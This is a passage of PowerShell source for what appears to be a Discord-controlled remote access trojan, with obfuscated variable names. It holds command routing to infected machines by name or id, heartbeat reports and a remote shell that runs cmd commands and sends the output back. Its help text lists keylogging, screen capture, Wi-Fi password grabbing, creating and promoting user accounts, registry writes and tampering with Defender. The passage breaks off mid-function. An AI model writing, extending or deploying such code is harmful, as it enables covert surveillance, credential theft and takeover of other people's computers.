# ==================== ROUTING ====================
function Get-MessageTarget {
    param([string]$Content)
    if ($Content -match '^@all\s+([\s\S]*)$')    { return @{ Target='all'; Cmd=$Matches[1] } }
    if ($Content -match '^@(\S+)\s+([\s\S]*)$') {
        $C8ky9sJ = $Matches[1]
        if ($C8ky9sJ -eq '*') { return @{ Target='all'; Cmd=$Matches[2] } }
        if ($C8ky9sJ.ToLower() -eq 'me') { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($C8ky9sJ.ToLower() -eq $script:pcName.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($C8ky9sJ.ToLower() -eq $script:hostname.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    if ($Content -match '^#([0-9a-fA-F]+)\s+([\s\S]*)$') {
        $FADD18i = $Matches[1].ToLower()
        if ($FADD18i -eq $script:machineId) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    return @{ Target='all'; Cmd=$Content }
}

function Test-IsShellTarget {
    if ($script:shellTargets.Count -eq 0) { return $false }
    $XfeP = $script:pcName.ToLower()
    $C8ky9sJ = $script:hostname.ToLower()
    foreach ($JjMCP in $script:shellTargets) {
        $D6qD = $JjMCP.ToLower()
        if ($D6qD -eq 'all' -or $D6qD -eq '*' -or $D6qD -eq $XfeP -or $D6qD -eq $C8ky9sJ) { return $true }
    }
    return $false
}

function Send-Heartbeat {
    try {
        $E3MmCtUD = (Get-Date) - $script:startTime
        $FsP6FU = if (Test-Admin) { "admin" } else { "user" }
        $n05bGthq = if ($script:isSet) { "" } else { " *(chua setpc)*" }
        $CnGgkHz9 = if ($script:shellMode) { " shell" } else { "" }
        $cqSkz = "ON **$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m | $FsP6FU | cwd ``$($script:workDir)``$n05bGthq$CnGgkHz9"
        Send-DiscordMessage -Content $cqSkz -NoTag
        $script:lastBeat = Get-Date
    } catch { }
}

function Resolve-ShellLine {
    param([string]$Line, [string]$MsgId)
    $Line = ([string]$Line).Trim()
    if (-not $Line) { return }
    if ($Line -match '^(\S+)\s*([\s\S]*)$') { $PAbEkp = $Matches[1]; $GQzq = $Matches[2] }
    else { $PAbEkp = $Line; $GQzq = "" }
    $cFTcdMtX = $PAbEkp.ToLower()

    if ($cFTcdMtX -in @("cd","chdir","pushd","popd")) {
        $tfmq = $GQzq.Trim().Trim('"').Trim("'")
        if ($cFTcdMtX -eq "popd") { $tfmq = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
        if ($cFTcdMtX -in @("cd","chdir","pushd") -and -not $tfmq) { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
        try {
            if ($tfmq -eq "..") { $kDrk = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
            elseif ($tfmq -eq ".") { $kDrk = $script:workDir }
            elseif ($tfmq -match '^[A-Za-z]:$') { $kDrk = "$tfmq\" }
            elseif ([System.IO.Path]::IsPathRooted($tfmq)) { $kDrk = [System.IO.Path]::GetFullPath($tfmq) }
            else { $kDrk = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $tfmq)) }
            if (Test-Path -LiteralPath $kDrk -PathType Container) { $script:workDir = (Get-Item -LiteralPath $kDrk).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId }
            else { Send-DiscordMessage -Content "not found: ``$kDrk``" -ReplyToId $MsgId }
        } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $MsgId }
        return
    }
    if ($cFTcdMtX -eq "pwd") { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("exit","quit")) { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("cls","clear")) { Send-DiscordMessage -Content "cleared" -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("ls","ll","la")) { $Aa5Lc = if ($cFTcdMtX -eq "la") { "/a" } else { "" }; $FVc0BFE = Invoke-CmdCommand -Command "dir $Aa5Lc $GQzq".Trim(); Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("cat","less","more")) { $FVc0BFE = Invoke-CmdCommand -Command "type $GQzq"; Send-CodeBlock -Title "cat" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -eq "cp") { $FVc0BFE = Invoke-CmdCommand -Command "copy $GQzq"; Send-CodeBlock -Title "cp" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -eq "mv") { $FVc0BFE = Invoke-CmdCommand -Command "move $GQzq"; Send-CodeBlock -Title "mv" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -eq "rm") { $FVc0BFE = Invoke-CmdCommand -Command "del /q $GQzq"; Send-CodeBlock -Title "rm" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("rmdir","rd")) { $FVc0BFE = Invoke-CmdCommand -Command "rmdir /s /q $GQzq"; Send-CodeBlock -Title "rmdir" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -in @("mkdir","md")) { $FVc0BFE = Invoke-CmdCommand -Command "mkdir $GQzq"; Send-CodeBlock -Title "mkdir" -Body $FVc0BFE -ReplyToId $MsgId; return }
    if ($cFTcdMtX -eq "echo") { if ($GQzq -eq "." -or $GQzq -eq "") { Send-DiscordMessage -Content "(blank)" -ReplyToId $MsgId } else { Send-DiscordMessage -Content $GQzq -ReplyToId $MsgId }; return }
    if ($cFTcdMtX -eq "help") { Send-DiscordMessage -Content "go !help" -ReplyToId $MsgId; return }
    $FVc0BFE = Invoke-CmdCommand -Command $Line
    Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $FVc0BFE -ReplyToId $MsgId
}

$IBzwDT9 = @'
**AGENT v8.7**
**SHELL:** ``!shellon [PC...]`` ``!shelloff`` ``!shells``
**ROUTE:** ``@all`` ``@PC1`` ``@me`` ``#<id>``
**BOT:** ``!help`` ``!ping`` ``!id`` ``!instance`` ``!setpc`` ``!bot_info`` ``!beat`` ``!silent on|off``
**FILE:** ``!upload`` ``!send`` ``!download <url>`` ``!dl`` ``!save`` ``!edit`` ``!listfiles`` ``!screenshot`` ``!grab``
**CAPTURE:** ``!capture [fps] [q] [sec] [mon]`` (sec=0 = infinite) | ``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``
**INPUT:** ``!sendkey <text>`` | ``!keys <text>``
**KLOG:** ``!keylog`` (start) | ``!keystop`` (stop + upload) | ``!keystat`` | ``!keylog clear``
**SYS:** ``!sysinfo`` ``!cpu`` ``!ram`` ``!disk`` ``!gpu`` ``!processes`` ``!services`` ``!whoami_all``
**NET:** ``!ipconfig`` ``!netstat`` ``!wifipass`` ``!pubip`` ``!ping_net`` ``!tracert`` ``!port``
**USER:** ``!netuser`` ``!netuser_add`` ``!netuser_passwd`` ``!promote_admin`` ``!netlocalgroup``
**PWR:** ``!lock`` ``!sleep`` ``!shutdown_sys`` ``!restart_sys`` ``!volume`` ``!msg <t>`` ``!speak <t>``
**REG/TASK:** ``!regread`` ``!regwrite`` ``!tasks`` ``!task_run``
**SEC:** ``!defender`` ``!av`` ``!takeown`` ``!icacls`` ``!sfc`` ``!chkdsk`` ``!bcdedit``
**WMIC:** ``!wmic_bios`` ``!wmic_cpu`` ``!wmic_disk`` ``!wmic_os`` ``!wmic_gpu`` ``!wmic_ram``
**EXEC:** ``!<cmd>`` | ``!cmd <cmd>`` | ``!ps <ps>``
'@

function Handle-Command {
    param($Message)
    try {
        if ($script:allowedUsers.Count -gt 0 -and $Message.author.id -notin $script:allowedUsers) { return }

        $djla5Q    = [string]$Message.content
        $F8INmfY = $Message.author.username
        $msgId  = $Message.id
        $iI1gWABd = $djla5Q.Trim()
        $eITC67 = ($Message.attachments -and $Message.attachments.Count -gt 0)

        $y9GRg3 = Get-MessageTarget -Content $iI1gWABd
        if ($y9GRg3.Target -eq 'other') { return }
        $ZFZ3q = ([string]$y9GRg3.Cmd).Trim()
        if (-not $ZFZ3q -and -not $eITC67) { return }
        $gQaFy6BG = ""
        if ($ZFZ3q -match '^(\S+)') { $gQaFy6BG = $Matches[1].ToLower() }
        $bdUegpN = $null
        if ($ZFZ3q -match '^[!/]') { $bdUegpN = ($ZFZ3q -replace '^[!/]', '').Trim() }
        elseif ($script:shellMode -and (Test-IsShellTarget) -and $ZFZ3q) {
            if ($gQaFy6BG -in $script:botOnlyCommands) { $bdUegpN = $ZFZ3q }
            else {
                $PKZpT = Get-Date -Format 'HH:mm:ss'
                [void]$script:history.Add("[$PKZpT] ${F8INmfY}: $ZFZ3q")
                while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }
                Resolve-ShellLine -Line $ZFZ3q -MsgId $msgId
